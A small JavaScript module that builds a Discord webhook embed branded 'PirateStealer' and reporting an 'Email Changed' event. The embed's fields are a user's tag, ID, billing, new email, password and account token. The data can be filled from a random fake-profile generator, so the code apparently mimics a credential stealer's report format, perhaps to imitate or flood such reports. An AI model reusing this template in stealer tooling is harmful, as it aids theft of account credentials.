const { pirateStealerConfig, generateRandomProfileWithPic, warpTripleQuote, randomNumString } = require('./utils');

async function emailChangeEmbed(account) {
    account = account || await generateRandomProfileWithPic();
    const { injectionInfo, id, billing, tag, token, password, image, nitro, email, badges } = account;
    return {
        username: "PirateStealer",
        embeds: [{
            title: "Email Changed",
            color: pirateStealerConfig["embed-color"],
            fields: [{
                name: "Info",
                value:injectionInfo,
                inline: false
            }, {
                name: "Username",
                value: `\`${tag}\``,
                inline: true
            }, {
                name: "ID",
                value: `\`${id}\``,
                inline: true
            }, {
                name: "Nitro",
                value: `${nitro}`,
                inline: false
            }, {
                name: "Badges",
                value: `${badges}`,
                inline: false
            }, {
                name: "Billing",
                value: `${billing}`,
                inline: false
            }, {
                name: "New Email",
                value: `\`${email}\``,
                inline: true
            }, {
                name: "Password",
                value: `\`${password}\``,
                inline: true
            }, {
                name: "Token",
                value: `\`\`\`${token}\`\`\``,
                inline: false
            }],
            author: {
                name: "PirateStealer"
            },
            footer: {
                text: "PirateStealer"
            },
            thumbnail: {
                url: image
            }
        }]
    };
}

module.exports.emailChangeEmbed = emailChangeEmbed;